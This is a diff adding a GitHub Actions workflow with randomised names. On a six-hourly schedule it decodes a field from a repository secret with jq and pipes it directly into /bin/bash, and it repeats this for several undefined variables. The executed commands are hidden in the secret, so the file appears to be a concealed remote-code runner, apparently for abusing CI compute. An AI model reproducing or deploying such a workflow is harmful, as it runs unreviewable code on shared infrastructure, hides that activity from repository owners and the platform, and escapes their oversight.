@@ -1,0 +1,22 @@
+name: zhaoyinluo4178
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaoyinluo4178
+        env:
+          yux39597: ${{ secrets.yux39597 }}
+        run: |
+          echo $yux39597 | jq -r .gfvr016 | /bin/bash
+          echo $vzuz98 | jq -r .xdv53 | /bin/bash
+          echo $lr499 | jq -r .mctfw1817 | /bin/bash
+          echo $qksu30860 | jq -r .xcxs98 | /bin/bash
+          echo $p9 | jq -r .qzam00 | /bin/bash
+
